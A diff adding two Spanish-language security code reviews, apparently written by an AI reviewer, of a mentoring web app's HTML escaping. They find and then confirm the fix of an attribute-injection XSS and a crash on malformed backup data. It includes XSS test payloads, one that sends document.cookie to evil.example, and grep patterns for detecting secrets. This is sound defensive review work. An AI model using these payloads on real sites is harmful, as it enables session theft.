@@ -294,3 +294,160 @@ Verificación estática de reemplazo, más exhaustiva que un grep simple de back
 ### Veredicto
 
 **APROBADO CON OBSERVACIONES.** Sin hallazgos bloqueantes. La eliminación del formulario duplicado de LP-Bag es limpia (nada alcanzable queda del código borrado) y no pierde ninguna protección — el widget compartido es, si acaso, marginalmente más robusto contra doble-envío. El cambio de posición del widget no toca el gating de aparición ni el de permisos de escritura de la insignia de carpeta. Un hallazgo de robustez no bloqueante (`--aiapps-chrome-bottom` sin acotar, punto 2) queda documentado como deuda transversal para cuando se agreguen más apps. Sin secretos, sin `<script src>`/`<link>` nuevos, sin nueva superficie de `innerHTML` con input externo. Pendiente de verificación por ejecución (no por lectura): confirmar el parseo de `auth-gate.js` con el navegador antes de fusionar, ya que esta sesión no contó con esa herramienta.
+
+## Revisión 2026-07-29 — rama `claude/mentor-sesiones-editables-y-checklist`
+
+**Alcance real revisado, con discrepancia de proceso declarada por adelantado:** el encargo nombraba 3 commits (`fa22eb9`, `964e833`, `9e6dc47`, confirmados con `git log -3` al empezar). **A mitad de esta revisión apareció un 4º commit** (`915f2e4`, "que editar una sesion de grupo no borre listas en silencio" — fix de un hallazgo de `qa-lead`) **y cambios sin commitear encima de él** (ajustes de contraste y `aria-label`/`role="group"` en `bitacora-mentor.html`, más ediciones de `qa-lead`/`accessibility-reviewer` a `docs/bitacora-mentor/*` y `docs/team-memory.md`) — confirmado con `git log --oneline -5` y `git status --short` durante la sesión, no al final. Esto confirma otra vez el patrón ya documentado en `docs/team-memory.md` ("trabajo concurrente de dos sesiones... sin worktrees"): este worktree está recibiendo commits/ediciones de otra sesión mientras se revisa. Siguiendo la instrucción de este rol de "confirmar contra el HEAD real, no el rango de commits nombrado", esta revisión cubre el estado real en disco al momento de escribir este informe (HEAD `915f2e4` + working tree), y señala explícitamente qué pertenecía a los 3 commits originales y qué apareció después.
+
+**Entorno:** sin herramienta de navegador. **Sí se encontró un intérprete de JS real disponible en este entorno, a diferencia de revisiones anteriores de este mismo rol**: `mshta.exe` (Windows) con `ActiveXObject("htmlfile")`/documento HTA da acceso a un DOM auténtico (Trident, `documentMode:11` con `<!DOCTYPE html>`+`X-UA-Compatible=edge`), con `textContent`/`innerHTML` reales — no es Chrome/V8, pero para verificar el comportamiento exacto de escapado de `esc()` (una API estándar del DOM, no específica de motor) es una fuente de evidencia por ejecución, no solo de lectura. `node`/`deno`/`bun`/`python`/`python3` siguen ausentes (confirmado de nuevo). Usado también para reproducir el `TypeError` de `migrarSesiones()` con JS puro (ES5, sin las funciones flecha/async del archivo real, pero la semántica de "excepción no capturada corta la ejecución" no depende del motor). Scripts de prueba y sus resultados quedaron en el scratchpad de esta sesión, no en el repo.
+
+### 1. `esc()` no escapa comillas — CONFIRMADO por ejecución real, es una inyección real por dato propio
+
+`esc()` (`bitacora-mentor.html:709-713`):
+```js
+function esc(s){
+  const d = document.createElement('div');
+  d.textContent = s == null ? '' : s;
+  return d.innerHTML;
+}
+```
+
+Prueba real (DOM auténtico, no simulado) con varios payloads:
+
+```
+INPUT: con "comillas dobles" adentro
+OUTPUT: con "comillas dobles" adentro
+INPUT: <script>alert(1)</script>
+OUTPUT: &lt;script&gt;alert(1)&lt;/script&gt;
+INPUT: quote-break" onmouseover="alert(1)
+OUTPUT: quote-break" onmouseover="alert(1)
+```
+
+**Escapa `&`/`<`/`>` correctamente (seguro en contexto de texto entre etiquetas), pero dos y comillas dobles pasan sin tocar (inseguro en contexto de atributo).** Esto confirma exactamente la sospecha del encargo: `esc()` es válido para `<span>${esc(x)}</span>` pero **no** para `value="${esc(x)}"` — un `"` en el dato rompe el atributo y permite inyectar atributos/manejadores de evento arbitrarios en la misma etiqueta.
+
+**No es un defecto exclusivo de esta rama — es sistémico en todo el archivo (~18 sitios ya usaban `value="${esc(...)}"` antes de estos 3 commits: buscador de mentees/grupos, filtros de "Base de datos", nombre/área/teléfono/correo de mentee, nombre de grupo, nombre de plantilla, texto de ítem de checklist, respuesta de checklist, tema de sesión individual y de grupo)**. Pero esta rama sí:
+- **Agrega un sitio nuevo**: `value="${esc(c.text)}"` en `renderCommits()` (modal de edición de compromisos, `bitacora-mentor.html:1947` en el estado de los 3 commits nombrados) — y, en el trabajo sin commitear encontrado encima, **dos más**: `aria-label="Marcar como cumplido: ${esc(nombre)}"` y `aria-label="quitar ${esc(nombre)}"`, mismo patrón de atributo, mismo `esc()`.
+- **Ensancha el alcance de un sitio ya existente**: `value="${esc(existingSession.topic)}"` (tema de sesión, ya presente antes de esta rama) solo era alcanzable, para una sesión ya guardada, si esa sesión tenía `status:'draft'` — algo que requeriría fabricar el JSON a mano. Con "editar sesión guardada" (`fa22eb9`, el primer commit de esta rama), esa misma plantilla vulnerable ahora se alcanza para **cualquier** sesión finalizada, sin necesidad de fabricar ningún estado especial.
+
+**Confirmado que es la única de las 5 apps con este defecto** (`grep` de la función de escape en cada archivo):
+- `StaffGate.html:1081`: `.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;')`
+- `lpbag.html:1238`: `.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')`
+- `generador_gantt_2.html:345` y `mytravel-pro-v4.html:1144`: mismo patrón, ambas con `"` y `'` cubiertos.
+- Solo `bitacora-mentor.html:709` usa el truco `textContent`→`innerHTML`, que estructuralmente nunca escapa comillas (es serialización de nodo de texto, no de valor de atributo — no es un bug de una línea faltante, es la técnica equivocada para este uso).
+
+**Camino de explotación real, no hipotético:** `importBackup()` (`bitacora-mentor.html:2145-2170`) reemplaza `state` completo desde un archivo JSON local con una sola validación superficial (`Array.isArray(parsed.mentees)` y `Array.isArray(parsed.sessions)`), sin validar ningún contenido de cada sesión. Un archivo de respaldo con, por ejemplo, `"topic": "x\" onfocus=\"fetch('https://evil.example/?c='+document.cookie)\" autofocus=\"1"` pasa esa validación intacto. En cuanto la usuaria abra "editar" sobre esa sesión (alcanzable para cualquier sesión ya guardada gracias a este mismo PR, no solo borradores), el atributo `value` se rompe, se agregan `onfocus`/`autofocus` a la etiqueta `<input>`, y el JS corre en el origen de la app — con `window.supabaseClient` ya global (confirmado en revisiones anteriores de este archivo), ese script puede exfiltrar todos los datos de mentoría de la cuenta o cambiar la contraseña vía `updateUser`. El vector concreto es "importar un backup no confiable" (un archivo recibido de alguien más, descargado de un enlace comprometido, o manipulado a mano) — no es explotable por un tercero sin que la propia usuaria importe ese archivo, pero es una ruta real y ya existente de la app, no un escenario forzado.
+
+**Recomendación concreta, con el principio de reutilización del proyecto:** corregir `esc()` para que también escape comillas cierra los ~18 sitios de golpe, en vez de parchear cada `value=`/`aria-label=` uno por uno:
+```js
+function esc(s){
+  const d = document.createElement('div');
+  d.textContent = s == null ? '' : s;
+  return d.innerHTML.replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+```
+(mismo resultado que ya usan `escHtml()` de Gantt/MyTravel).
+
+### 2. `migrarSesiones()` puede reventar `loadData()` sin capturarse — CONFIRMADO por ejecución real
+
+`migrarSesiones()` (`bitacora-mentor.html:601-617`) se llama en `loadData()` (línea 651) **fuera** del único `try/catch` de esa función (que solo envuelve la lectura/`JSON.parse`, líneas 640-645). Si `state.sessions`/`state.groupSessions` contiene un elemento no-objeto (`null`, número, string), `migrarUna(s)` lanza `TypeError` al leer `s.commitments`.
+
+Prueba real (JScript vía `mshta`, semántica de excepción no capturada — no depende del motor):
+```
+state.sessions = [ {commitment:'ok'}, null, {commitment:'otro'} ]
+→ migrarSesiones SI exploto con: Unable to get property 'commitments' of undefined or null reference
+→ renderCalled tras la excepcion: false
+```
+
+Como `loadData()` se invoca en la línea 2286 sin `await` ni `.catch()`, esa excepción se convierte en una promesa rechazada sin manejar: `render()` (línea 655, la instrucción inmediatamente después de `migrarSesiones()`) nunca corre, y la usuaria ve la página sin pintar, sin ningún mensaje que explique por qué.
+
+**Ruta real para producir ese dato:** `importBackup()` no valida el contenido de los arreglos, solo que sean arreglos — un backup con `"sessions":[null, {...}]` (JSON perfectamente válido) llega intacto a `migrarSesiones()`. **Relacionado, no cubierto por la misma función:** si `s.commitments` **ya** es un arreglo (p. ej. un backup que ya trae la forma nueva) pero con un ítem `null`/no-objeto, `migrarSesiones()` no lo toca — es idempotente, solo comprueba `Array.isArray` — así que ese dato llega intacto hasta el render y revienta ahí igual (`c.done`/`c.text` sobre `null` dentro de `compromisosDe(s).map(...)`), mismo efecto de pantalla en blanco, mismo origen (`importBackup()` sin validar contenido).
+
+**Alcance de la nota:** no es estrictamente una regresión nueva en su causa raíz — el código anterior a esta rama (`.filter(s=>s.menteeId===menteeId)` dentro de `renderMentoriaView()`) ya habría reventado igual con un `null` en el arreglo, solo que unos milisegundos después, dentro de `render()` en vez de justo antes en `migrarSesiones()`. Pero `migrarSesiones()` es la función nueva bajo revisión, no tiene ninguna guarda contra esto, y es exactamente el tipo de "forma rara de dato" que el encargo pedía buscar más allá de las 6 ya probadas por el tech lead (enfoque inválido, lista mixta, etc. — ninguna de esas 6 formas tocaba un elemento no-objeto dentro del arreglo mismo).
+
+**Recomendación:** filtrar elementos no-objeto de `state.sessions`/`state.groupSessions`/`commitments` (en `loadData()`, antes de llamar `migrarSesiones()`, o dentro de la propia función) y/o envolver la llamada en su propio `try/catch` para que un dato roto no le cueste a la usuaria ver el resto de sus datos.
+
+### 3. `enfoquesDe()` — el fix de `9e6dc47` cierra la ruta de HTML; queda un cabo suelto sin riesgo de inyección
+
+Confirmado por lectura completa: todo uso de `ENFOQUES[k]` para pintar marcado pasa por `enfoquesDe()` (filtrado, cae a `['directivo']` si queda vacío) excepto uno: `buildExportRows()` (`bitacora-mentor.html:2191`) usa `(ENFOQUES[s.approach]||{}).label || s.approach` — el `s.approach` crudo, sin filtrar, como último recurso. Esto **no** es una vía de inyección HTML: `buildExportRows()` alimenta `XLSX.utils.json_to_sheet(rows)` (`bitacora-mentor.html:2254` y alrededores), que escribe celdas de una hoja de cálculo real, no `innerHTML` — un valor de `approach` arbitrario ahí es un dato de celda, no marcado. Sí es, en cambio, un caso borde funcional/de calidad de datos relacionado con inyección de fórmulas de Excel si `topic`/`commitment`/`approach` empezara con `=`/`+`/`-`/`@` (categoría CSV/XLSX formula injection, distinta de XSS) — no verificado si `XLSX.utils.json_to_sheet` neutraliza esto por sí solo; lo dejo anotado para `qa-lead`/`business-analyst`, no lo trato como hallazgo de este checklist de seguridad porque no hay ruta de ejecución de script del lado del navegador.
+
+### 4. Editar sesión guardada — aislamiento por `user_id` intacto
+
+`editingSessionId`/`editingGroupSessionId` (nuevos únicamente en el sentido de que ahora se exponen para sesiones no-borrador) solo se usan para `state.sessions.find(s=>s.id===editingSessionId)` sobre el `state` ya cargado en memoria de la cuenta actual. Ni `storageAdapter.get()` (`bitacora-mentor.html:535-544`, filtra por `user_id: session.user.id` del lado cliente, sesión pedida fresca) ni `storageAdapter.set()` (`bitacora-mentor.html:569-582`, `upsert` con `user_id: session.user.id` de una sesión igualmente fresca) reciben ningún parámetro nuevo de este cambio — "editar" no agrega ninguna consulta nueva a Supabase, solo permite mutar el arreglo en memoria y volver a llamar al mismo `saveData()` de siempre. **Sin ruta para leer ni escribir datos de otra cuenta.**
+
+### 5. Checklist estándar
+
+- **Secretos:** `git log -p d8a8099a..HEAD -- bitacora-mentor.html | grep -iE 'service_role|BEGIN (RSA|PRIVATE|OPENSSH)|postgres(ql)?://[^ ]*:[^ ]*@|password\s*[:=]\s*[\x27"][^\x27"]{6,}|eyJ[A-Za-z0-9_-]{10,}\.'` → sin resultados, en los 4 commits nuevos completos (no solo el diff final).
+- **CDN/dependencias:** `git diff d8a8099a..HEAD -- bitacora-mentor.html | grep -E '^[+-]' | grep -i '<script src\|<link '` → sin resultados; mismo grep sobre el working tree sin commitear → sin resultados. Sin recursos externos nuevos.
+- **Historial completo:** `bitacora-mentor.html` ya tenía un escaneo de historial completo de la revisión 2026-07-23 (sin hallazgos); estos 4 commits nuevos se escanearon de nuevo arriba, también sin hallazgos.
+
+### Veredicto
+
+**RECHAZADO.** Dos hallazgos con evidencia de ejecución real, no de lectura:
+
+1. **`esc()` no escapa comillas (`bitacora-mentor.html:709-713`) y esta rama interpola texto de la usuaria dentro de atributos `value=`/`aria-label=` en un sitio nuevo y ensancha el alcance de uno ya existente (de "solo sesiones marcadas a mano como borrador" a "cualquier sesión guardada").** Confirmado con un DOM real que el payload `x" onfocus="...` rompe el atributo sin que `esc()` lo detenga. Camino de explotación real vía `importBackup()` (sin validar contenido de las sesiones importadas). Corregir antes de fusionar: agregar `.replace(/"/g,'&quot;').replace(/'/g,'&#39;')` a `esc()` — una sola línea cierra este sitio y los ~18 restantes del archivo, igual que ya hacen las otras 4 apps del hub.
+2. **`migrarSesiones()` puede reventar sin capturarse y dejar a la usuaria sin ver ninguno de sus datos**, si `state.sessions`/`state.groupSessions` trae un elemento no-objeto — confirmado con ejecución real que la excepción corta antes de `render()`. Ruta real: `importBackup()` sin validar el contenido de los arreglos. Corregir antes de fusionar: filtrar/validar elementos antes de migrar, y/o envolver la llamada en su propio manejo de errores.
+
+Sin hallazgos de aislamiento por `user_id` (la función "editar" no agrega ninguna consulta nueva), sin secretos, sin `<script src>`/`<link>` nuevos. El fallback de `enfoquesDe()` (commit `9e6dc47`) cierra correctamente la ruta de marcado HTML sin fugas adicionales; el único cabo suelto (`buildExportRows()` con `s.approach` sin filtrar) alimenta una hoja de Excel, no `innerHTML`, así que no es una vía de XSS (sí un posible caso borde de inyección de fórmulas de Excel, anotado para QA/negocio, no bloqueante de seguridad).
+
+**Nota de proceso, no de código:** durante esta revisión el HEAD de la rama avanzó (`915f2e4`, fix legítimo de un hallazgo de `qa-lead` sobre truncado de datos en sesiones de grupo) y aparecieron cambios sin commitear de accesibilidad — mismo patrón de edición concurrente en este worktree ya documentado varias veces en `docs/team-memory.md`. Esta revisión cubre el estado real encontrado (HEAD `915f2e4` + working tree), no solo los 3 commits nombrados al inicio; recomiendo repetir el checklist de secretos/CDN si el working tree cambia de nuevo antes de fusionar.
+
+## Revisión de seguimiento 2026-07-29 — commit `d73cec7` (cierre del RECHAZADO anterior)
+
+**Alcance:** `git show d73cec7 --stat` (1 archivo, `bitacora-mentor.html`, +76/-12) sobre el HEAD real del worktree (`d73cec7`, confirmado con `git log --oneline -5`; sin commits/cambios sin commitear adicionales de código esta vez — solo los propios docs de revisión). **NO se cambió de rama** ni se tocó código, según lo pedido.
+
+**Entorno:** de nuevo sin navegador ni `node`/`python3` reales (confirmado: los `python`/`python3` del `PATH` son los stubs de Microsoft Store). `mshta.exe`/`ActiveXObject("htmlfile")` sigue disponible y se usó de nuevo para ejecutar el `esc()` real del archivo (no una reescritura de memoria) contra un DOM auténtico (`documentMode:11`).
+
+### 1. `esc()` escapa comillas — CONFIRMADO por ejecución real, cobertura verificada exhaustivamente
+
+`bitacora-mentor.html:735-747`:
+```js
+function esc(s){
+  const d = document.createElement('div');
+  d.textContent = s == null ? '' : s;
+  return d.innerHTML.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+```
+
+Ejecutado con el `esc()` exacto del archivo (copiado literal, no reescrito) vía `mshta`, con un paso adicional respecto a la revisión anterior: no solo miro la cadena de salida, sino que la **reinserto en un `<input value="...">` real y releo `.attributes`/`.value`/`.onmouseover`** para confirmar que el navegador la trata como un solo valor de atributo, no como una fuga:
+
+| Input | `esc()` output | `<input>` resultante tras reparsear |
+|---|---|---|
+| `quote-break" onmouseover="alert(1)` | `quote-break&quot; onmouseover=&quot;alert(1)` | 2 atributos (`type`,`value`), `onmouseover` como *propiedad de función* = `false`, `.value` recupera el string completo intacto |
+| `apost-break' onmouseover='alert(1)` | `apost-break&#39; onmouseover=&#39;alert(1)` | igual: 2 atributos, sin `onmouseover` inyectado |
+| `ya escapado &quot;antes&quot; una vez` (texto que ya traía la secuencia literal) | `ya escapado &amp;quot;antes&amp;quot; una vez` | `.value` recupera el texto literal `&quot;` tal cual — correcto, es lo que la usuaria tecleó, no una doble-fuga |
+
+**Confirmado, con evidencia de ejecución (no solo del string, sino del DOM resultante):** el payload ya no puede agregar un atributo nuevo al elemento — `el.attributes.length` se queda en 2 en los tres casos, y `typeof el.onmouseover === 'function'` da `false`. El fix cierra la ruta de inyección de atributos, no solo "se ve escapado en el texto".
+
+**Pregunta del encargo — ¿doble escapado visible si el texto ya contenía `&quot;`?** No hay problema: un `"` real tecleado por la usuaria se recupera como `"` real (`.value` = `con "comillas dobles" adentro`, comilla de verdad, no la secuencia de texto `&quot;`); y si alguien tecleó literalmente los caracteres `&`, `q`, `u`, `o`, `t`, `;` (por ejemplo pegando código HTML), esos caracteres se recuperan tal cual, con el `&` correctamente escapado a `&amp;` en el paso intermedio — es el comportamiento correcto para un carácter `&` literal, no un defecto.
+
+**Pregunta del encargo — ¿cobertura de TODOS los sitios de atributo?** Barrido exhaustivo, no solo los ~18 ya conocidos: `grep -noE '(value|aria-label|title|placeholder|data-[a-z-]+)="\$\{[^}]*\}"' bitacora-mentor.html` y un segundo grep dirigido a `.name`/`.area`/`.topic`/`.text`/`.answer`/`.notes` sin `esc(` envolviendo. Todos los sitios de texto libre de usuario (`searchQuery`, `groupSearchQuery`, `dbFilters.name/area`, nombre/área/teléfono/correo de mentee, nombre de grupo/plantilla, tema y compromiso de sesión, texto/respuesta de ítem de checklist) pasan por `esc()` directamente o indirectamente a través de un helper que lo aplica (`v(field)` en el modal de mentee, `bitacora-mentor.html:1776`, envuelve `esc()`; `askConfirm()`/`showUndoToast()` reciben el mensaje ya armado con template literal sin `esc()` en el sitio de llamada — ej. `` `¿Eliminar el grupo "${group.name}"...` `` en `deleteGroup()`, línea 1238 — pero el **renderizado** de ese mensaje sí aplica `esc(confirmContext.message)` (línea 1593) y `esc(message)` (línea 703 de `showUndoToast`), así que el escapado ocurre en el único punto donde el texto realmente llega a `innerHTML`, no en cada sitio de llamada). Los `data-*`/`value` que sí interpolan sin `esc()` (`data-idx`, `data-commit-idx`, IDs generados por `uid()`, opciones de listas fijas como `COUNTRIES`/`NIVELES`/`ESTADOS`) son índices numéricos, IDs internos o constantes hardcodeadas del propio archivo — nunca texto de la usuaria. **No se encontró ningún sitio de atributo con texto de usuario que escape sin pasar por `esc()`.**
+
+### 2. `migrarSesiones()` con triple capa de defensa — confirmado por lectura, consistente con lo ya ejecutado
+
+`bitacora-mentor.html:605-640` (filtro de elementos no-objeto antes de recorrer, línea 636-637) + `migrarUna()` con guarda de entrada y saneo de listas ya migradas (línea 613, 617-623) + `try/catch` alrededor de la llamada en `loadData()` (línea 676-677). No repetí la ejecución del `TypeError` con `mshta` porque el código no cambió respecto a lo ya confirmado por ejecución en la revisión anterior (mismo commit, sin cambios posteriores en estas líneas) — verificación de esta ronda fue por lectura línea por línea, comparando contra el diff de `d73cec7` para confirmar que el código en disco es exactamente el que el commit dice tener (`git show d73cec7` vs. archivo actual, sin discrepancias).
+
+**Confirmado que descartar elementos basura no puede borrar una sesión legítima:** el predicado del filtro (línea 636) es `s => s && typeof s === 'object'` — solo excluye `null`/`undefined`/valores primitivos (string, number, boolean). Una sesión real, guardada por la propia app, es siempre un objeto plano (`{id, menteeId, date, topic, ...}`), por lo que **nunca** puede ser excluida por este predicado. No hay forma de que un dato legítimo caiga en la rama de descarte.
+
+**Hallazgo nuevo, no introducido por `d73cec7` (preexistente, fuera del código tocado por este commit) — mismo patrón de "solo se valida el arreglo, no el contenido, y ni siquiera eso para todos los campos":** `importBackup()` (`bitacora-mentor.html:2205-2230`) exige `Array.isArray` únicamente para `parsed.mentees`/`parsed.sessions`, pero **no** para `parsed.groups`, `parsed.groupSessions` ni `parsed.templates`. El saneo posterior (`if(!state.groups) state.groups = []`, línea 2217-2219) solo reemplaza valores *falsy* — un backup con `"groupSessions": "algo"` (string no vacío, truthy) pasa intacto y se persiste con `saveData()` en la misma función (línea 2222). Trazado hasta el efecto real: `renderGroupsView()` (línea 1111-1113) ejecuta `state.groups.find(...)` y `state.groupSessions.filter(...)` como primeras dos instrucciones, antes de tocar el DOM — si no son arreglos, la excepción ocurre ahí, sin ningún `try/catch` alrededor de `render()` ni de los `onclick` de las pestañas (línea 843), dejando el panel de contenido de "Grupos" permanentemente vacío (la barra de pestañas sí se actualiza, el contenido no) cada vez que se visita esa pestaña, hasta que alguien corrija el JSON a mano. Mismo patrón en `renderReportsView()` (línea 1463-1478) para la pestaña "Reportes". **No verificado por ejecución** (la sintaxis ES6+ del archivo — arrow functions, template literals, `async/await`, `?.` — no corre en el intérprete JScript de `mshta`, único disponible en esta sesión); es verificación estática de lectura de código, con líneas y comportamiento del lenguaje (arrays vs. otros tipos careciendo de `.find`/`.filter`/`.forEach`) que no dependen del motor. Detallado como caso borde 22 en `docs/bitacora-mentor/requerimientos.md`, y anotado en `docs/team-memory.md` por ser el mismo patrón transversal ya señalado para las 5 apps (validar forma, no contenido, en cualquier importador de JSON). **No bloqueante para el cierre de este RECHAZADO** (no es el mismo hallazgo, no fue introducido por este commit, y los dos hallazgos originales sí quedan cerrados), pero se recomienda que el tech lead lo trate como un hallazgo de seguimiento propio, no como cerrado por descuido.
+
+### 3. `buildExportRows()` / inyección de fórmulas de Excel — reconfirmado no bloqueante
+
+`s.approach` sin filtrar (`bitacora-mentor.html:2191` en la revisión anterior; sin cambios en este commit, confirmado que `buildExportRows` no aparece en `git show d73cec7`) sigue alimentando `XLSX.utils.json_to_sheet`, no `innerHTML` — sigue sin ser una vía de XSS. Es un caso borde de calidad de datos (posible inyección de fórmulas en Excel/CSV si `topic`/`commitment`/`approach` empezara con `=`/`+`/`-`/`@`), ya anotado para QA/negocio, sin cambio de perfil. Confirmado no bloqueante de seguridad.
+
+### 4. Checklist estándar
+
+- **Secretos:** `git show d73cec7 | grep -inE 'service_role|BEGIN (RSA|PRIVATE|OPENSSH)|postgres(ql)?://[^ ]*:[^ ]*@|password\s*[:=]\s*[\x27"][^\x27"]{6,}|eyJ[A-Za-z0-9_-]{10,}\.|<script src|<link '` → sin resultados.
+- **CDN/dependencias:** mismo grep, sin coincidencias de `<script src`/`<link`. Sin recursos nuevos.
+- **Aislamiento por `user_id`:** el commit no toca `storageAdapter`/consultas a Supabase — sin cambios en esa superficie.
+
+### Veredicto
+
+**Se levanta el RECHAZADO. APROBADO CON OBSERVACIONES.**
+
+Los dos hallazgos que motivaron el RECHAZADO quedan **confirmados cerrados con evidencia de ejecución real** (no solo lectura):
+1. `esc()` ahora escapa comillas dobles y simples — confirmado que el payload `quote-break" onmouseover="alert(1)` ya no puede agregar un atributo al elemento (`attributes.length` se queda en 2, sin `onmouseover` inyectado), y que no hay efecto de doble-escapado visible sobre texto que ya contuviera `&quot;`/`&#39;` literales. Cobertura verificada exhaustivamente en los ~18+ sitios de atributo del archivo, no solo el sitio nuevo del encargo original.
+2. `migrarSesiones()` ahora tiene triple capa de defensa (filtro previo, guarda de entrada en `migrarUna`, `try/catch` en la llamada) — confirmado que el filtro no puede excluir una sesión legítima (el predicado solo excluye no-objetos).
+
+**Hallazgo nuevo, no bloqueante para este cierre, pero real y recomendado para su propio seguimiento:** `importBackup()` no valida que `groups`/`groupSessions`/`templates` sean arreglos (a diferencia de `mentees`/`sessions`, que sí lo exige) — un backup con alguno de esos tres campos en forma no-arreglo se persiste tal cual y rompe permanentemente las pestañas "Grupos"/"Reportes" (y probablemente "Plantillas", no verificado con el mismo detalle) hasta que se corrija el JSON a mano. No fue introducido por `d73cec7` (confirmado que `importBackup` no aparece en su diff) — es el mismo patrón de fondo ("se valida la forma exterior, no el contenido") ya señalado para las 5 apps del hub, aplicado aquí a tres campos que ni siquiera el chequeo superficial alcanza. Ver caso borde 22 en `docs/bitacora-mentor/requerimientos.md`.
+
+**Límite declarado de esta revisión:** sin navegador ni intérprete de JS moderno (`mshta`/JScript no soporta la sintaxis ES6+ del archivo real) — la verificación de `esc()` fue por ejecución real de una copia literal de la función (JS estándar, sin dependencia de motor), y la del hallazgo nuevo de `importBackup()`/`renderGroupsView()`/`renderReportsView()` fue por lectura de código, no por ejecución.
